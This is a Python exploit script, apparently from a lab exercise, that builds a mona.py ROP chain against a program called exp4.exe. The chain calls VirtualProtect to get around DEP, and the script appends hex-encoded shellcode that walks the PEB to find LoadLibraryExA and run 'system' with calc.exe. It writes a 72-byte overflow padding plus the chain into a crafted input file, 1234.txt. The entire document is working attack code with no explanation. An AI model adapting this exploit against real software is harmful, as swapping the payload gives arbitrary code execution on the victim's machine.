import struct

# rop chain generated with mona.py - www.corelan.be
rop_gadgets = [
    # [---INFO:gadgets_to_set_esi:---]

    0x00dd4499,  # POP ECX # RETN [exp4.exe]
    0x00000000,
    0x00000000,
    0x00f00688,  # ptr to &VirtualProtect() [IAT exp4.exe]

    0x00dc7799,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe]
    0x00b23eea,  # XCHG EAX,ESI # RETN [exp4.exe]
    # [---INFO:gadgets_to_set_ebp:---]
    0x00806159,  # POP EBP # RETN [exp4.exe]
    0x0089a861,  # & jmp esp [exp4.exe]
    # [---INFO:gadgets_to_set_ebx:---]
    0x00b29006,  # POP EBX # RETN [exp4.exe]
    0x00000201,  # 0x00000201-> ebx
    # [---INFO:gadgets_to_set_edx:---]
    0x00b13264,  # POP EDX # RETN [exp4.exe]
    0x00000040,  # 0x00000040-> edx
    # [---INFO:gadgets_to_set_ecx:---]
    0x00e13f27,  # POP ECX # RETN [exp4.exe]
    0x00efc8a9,  # &Writable location [exp4.exe]
    # [---INFO:gadgets_to_set_edi:---]
    0x0089ca01,  # POP EDI # RETN [exp4.exe]
    0x00b13e04,  # RETN (ROP NOP) [exp4.exe]
    # [---INFO:gadgets_to_set_eax:---]
    0x00c357f5,  # POP EAX # RETN [exp4.exe]
    0x90909090,  # nop
    # [---INFO:pushad:---]
    0x00b250d2,  # PUSHAD # RETN [exp4.exe]

    # 0x905962EB,  # jmp 0019EE1C
    0x9059016A,  # push 1 ,pop  ecx, nop

    # ------
    0x00001294,
    0x00000000,
    0x00000000,
    0x00000000,
    0x6376736D,
    0x30323172,
    0x6C6C642E,
    0x00000000,
    0x74737973,
    0x00006D65,
    0x00000000,
    0x00000000,
    0x636C6163,
    0x6578652E,
    0x00000000,
    0x00000000,
    0x64616F4C,
    0x7262694C,
    0x45797261,
    0x00004178,
    0x00000000,
    0x00000000,
    0x00000000,
    0x000000E8,
    0xEF835F00,
    0xB07F8905,
    0x52565053,
    0x81515455,
    0x000400EC,
    0x04458B00,
    0x0030A164,
    0x408B0000,
    0x1C408B0C,
    0x408B008B,
    0xF8478908,
    0x8BF88B57,
    0x548B3C47,
    0xD7037807,
    0x8B184A8B,
    0xDF03205A,
    0x8B348B49,
    0x47B8F703,
    0x39507465,
    0xB8F17506,
    0x41636F72,
    0x75044639,
    0x245A8BE7,
    0x8B66DF03,
    0x5A8B4B0C,
    0x8BDF031C,
    0xC7038B04,
    0x89DF8B5F,
    0xEB83FC43,
    0xC383531C,
    0xF873FF1C,
    0x89FC53FF,
    0x106AF443,
    0xEB83006A,
    0xC383534C,
    0xF453FF4C,
    0x8BA84389,
    0x3CEB83D0,
    0x3CC38353,
    0xFC53FF52,
    0x83AC4389,
    0x83532CEB,
    0xD0FF2CC3,
    0x8104C483,
    0x000400C4,
    0x5D5C5900,
    0x5B585E5A,
]

seq = 'A'*72

with open('1234.txt', 'w') as f:
    for i in seq:
        f.write(i)

with open('1234.txt', 'ab+') as f:
    for i in rop_gadgets:
        f.write(struct.pack('<I', i))
